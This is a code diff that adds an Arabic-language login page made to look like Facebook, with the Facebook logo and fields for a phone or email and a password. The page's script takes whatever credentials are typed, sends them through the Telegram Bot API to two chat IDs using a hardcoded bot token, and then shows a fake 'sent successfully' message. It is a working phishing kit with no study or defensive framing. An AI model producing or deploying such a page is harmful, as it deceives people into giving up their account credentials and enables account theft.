@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <style>
+        body {
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #0d0d0d;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            width: 90%;
+            max-width: 400px;
+            background-color: #1e1e1e;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.5);
+        }
+
+        .login-container img {
+            display: block;
+            margin: 0 auto 20px auto;
+            width: 50px;
+            height: 50px;
+        }
+
+        .login-container h1 {
+            text-align: center;
+            color: #ccc;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            font-size: 1em;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+            border-radius: 10px;
+            background-color: #2e2e2e;
+            color: #fff;
+        }
+
+        input:focus {
+            border-color: #3a86ff;
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            font-size: 1.1em;
+            font-weight: bold;
+            color: #fff;
+            background-color: #3a86ff;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #2563eb;
+        }
+
+        .forgot-password, .create-account {
+            display: block;
+            text-align: center;
+            margin: 10px 0;
+            color: #3a86ff;
+            text-decoration: none;
+        }
+
+        .forgot-password:hover, .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .success-message {
+            text-align: center;
+            margin-top: 20px;
+            color: #3a86ff;
+            font-size: 1.2em;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Logo">
+    <h1>تسجيل الدخول</h1>
+    <form id="login-form">
+        <input type="text" id="username" name="username" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
+        <input type="password" id="password" name="password" placeholder="كلمة السر" required>
+        <button type="submit">تسجيل الدخول</button>
+    </form>
+    <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+    <a href="#" class="create-account">إنشاء حساب جديد</a>
+    <p class="success-message" id="success-message">تم إرسال البيانات بنجاح.</p>
+</div>
+
+<script>
+    document.getElementById("login-form").addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+
+        const message = `طلب تسجيل دخول:\nاسم المستخدم: ${username}\nكلمة المرور: ${password}`;
+
+        const botToken = "7749081375:AAG-yKlbr-r7iiOx6n3Wj4M0PBHGO0Lmtg8";
+        const chatIds = ["6823320140", "7095522311"]; // قائمة المعرفات
+
+        chatIds.forEach(chatId => {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log(`تم إرسال الرسالة بنجاح إلى ${chatId}`);
+                    } else {
+                        console.error(`فشل إرسال الرسالة إلى ${chatId}`);
+                    }
+                })
+                .catch(error => {
+                    console.error(`خطأ أثناء إرسال الرسالة إلى ${chatId}:`, error);
+                });
+        });
+
+        // عرض رسالة تأكيد على نفس الصفحة
+        const successMessage = document.getElementById("success-message");
+        successMessage.style.display = "block";
+
+        // إعادة تعيين الحقول
+        document.getElementById("login-form").reset();
+    });
+</script>
+
+</body>
+</html>
